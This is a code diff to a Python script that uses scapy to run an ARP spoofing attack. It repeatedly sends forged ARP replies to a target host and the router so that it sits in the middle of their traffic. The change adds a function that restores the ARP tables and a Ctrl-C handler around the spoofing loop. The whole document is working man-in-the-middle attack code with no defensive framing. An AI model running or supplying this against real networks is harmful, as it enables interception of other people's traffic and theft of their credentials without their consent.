@@ -19,13 +19,23 @@ def spoof(target_ip,destination_ip):
     #target_mac=get_mac(target_ip)
     packet = scapy.ARP(op=2,pdst=target_ip,hwdst="",psrc=destination_ip)
     scapy.send(packet,verbose=False)
-    
+
+#Restore tables to normal fast
+def restore(destination_ip,source_ip):
+    #destination_mac=get_mac(destination_ip)
+    #source_mac=get_mac(source_ip)
+    packet = scapy.ARP(op=2,pdst=destination_ip,hwdst="",psrc=source_ip,hwsrc="")
+    scapy.send(packet,count=4,verbose=False)
+
 #repeat updating  ARP table
 packet_counter=0
-while True:
-    spoof(target_ip, router_ip)
-    spoof(router_ip, target_ip)
-    packet_counter+=2
-    print("\r[+] Send  " +str(packet_counter)+ "  packets.",end="")
-    time.sleep(2)
-
+try:
+    while True:
+        spoof(target_ip, router_ip)
+        spoof(router_ip, target_ip)
+        packet_counter+=2
+        print("\r[+] Send  " +str(packet_counter)+ "  packets.",end="")
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("\n\nQuitting...")
+    restore(target_ip, router_ip)
